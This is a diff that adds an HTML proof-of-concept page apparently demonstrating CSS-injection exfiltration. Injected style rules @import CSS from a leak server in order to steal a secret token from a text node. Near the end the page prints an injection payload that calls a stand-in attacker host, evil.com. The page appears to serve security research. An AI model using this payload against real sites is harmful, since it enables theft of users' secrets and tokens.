@@ -1,0 +1,30 @@
+<!doctype html>
+<head>
+<title>css pow4h</title>
+<script>
+// just to avoid automatic run
+const URL = "http://leaking.localhost.net:3001";
+function foo() {
+    show.style='display:block;';
+    setTimeout("show.style='display:none'; start();", 2000);
+}
+function start() {
+    document.getElementById('injection').innerHTML="<style>@import url('"+URL+"/start');</style>";
+}
+</script>
+</head>
+<body>
+<h3>nothing bad happening here, keep calm and enjoy the style :)</h3>
+<img id=show style=display:none src="https://media.giphy.com/media/sjztxIialKYRq/giphy.gif">
+<!-- all this markup can be avoid by using regular webpages elements, classes, attributes, etc. the longer the token to leak the more specific rules we will need (I was too lazy to generalize this) -->
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>
+<div id=leakme>"sup3r.s3cret.token"</div>
+<p>(the secret is a text node)</p>
+<!-- injection is here -->
+<hr>
+<div id=injection></div>
+<button onclick=foo()>start</button>
+<hr>
+<plaintext>
+// This is the only HTML injected, all logic is server-side
+<style>@import url(htp://evil.com/start)</style>
